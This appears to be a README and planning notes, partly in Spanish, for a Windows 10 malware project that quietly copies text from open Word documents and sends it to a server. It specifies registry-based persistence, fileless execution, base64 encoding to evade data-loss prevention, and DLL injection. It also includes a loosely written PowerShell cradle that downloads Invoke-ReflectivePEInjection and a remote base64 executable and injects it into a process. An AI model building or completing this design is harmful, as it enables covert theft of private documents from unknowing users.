# winwordexfil
A kind of malware to exfiltrate Word documents text written

Write code for Windows 10 that:

    - Is persistent (survives reboots).
    - It is as file-less as possible (should leave a minimal amount of code on disk, for as little time as possible).
    - Requires as little privileges as possible.
    - Searches for Word processes and extracts all text written (both for already open documents and for new Word instances).
    - Send the gathered data to a server.
    
 


cuando dropeas: haces persistencia, lanzas watcher

haces persistencia (a nivel usuario) que es una entrada en el registro para que se ejecute al inicio de sesión 

pendiente -> watcher para ver cuando se abre el world

exfiltrar el contenido de los documentos abiertos --> basic dlp evasion encoding in base64. more advanced techniques like adding cypher.

https://community.spiceworks.com/how_to/163884-getting-data-from-a-word-document-using-powershell

https://medium.com/@riffsandhacks/data-exfiltration-bypassing-a-misconfigured-dlp-to-exfiltrate-sensitive-data-1236989c76c1

https://stackoverflow.com/questions/52074362/how-to-connect-powershell-script-to-an-already-opened-document




http server
https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7






in order to create a better malware or wanted to use other techniques reflectivePEInjection can be used



IEX((New-Object System).DowloadString powershell infoKe-ReflectivePEInjection.ps1)
$b = downloadstring(executable.bin)
$c system.convert::frombase64string($b)
Invoke-ReflectivePEInjection -PEBytes $c   /indicanto el proceso al que quieres ir



process dll injection to hook windows api call 



Microsoft MSHTML Remote Code Execution Vulnerability